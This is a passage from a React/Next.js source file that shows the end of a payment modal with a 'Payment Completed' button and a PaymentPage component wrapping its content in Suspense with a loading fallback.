                className="w-full py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-lg text-sm shadow transition"
              >
                Payment Completed
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default function PaymentPage() {
  return (
    <Suspense fallback={<div className="store-shell" style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>Loading...</div>}>
      <PaymentContent />
    </Suspense>
  );
}